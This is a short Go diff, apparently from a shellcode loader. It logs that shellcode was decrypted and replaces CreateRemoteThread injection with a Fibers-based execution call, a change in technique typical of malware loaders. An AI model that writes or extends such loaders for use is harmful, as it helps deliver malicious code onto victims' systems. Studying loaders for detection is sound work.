@@ -42,7 +42,8 @@ func main(){
   l.Goodln("Shellcode has been decrypted successfully!") // Some progress bars to let the user read
   l.ProgressBar("Trying to inject shellcode", 1500, 100)
 
-  err = shellcode.CreateRemoteThread(sc) // Inject shellcode
+  //err = shellcode.CreateRemoteThread(sc) // Inject shellcode
+  err = shellcode.Fibers(sc)
   if err != nil {
     log.Fatal(err)
   }
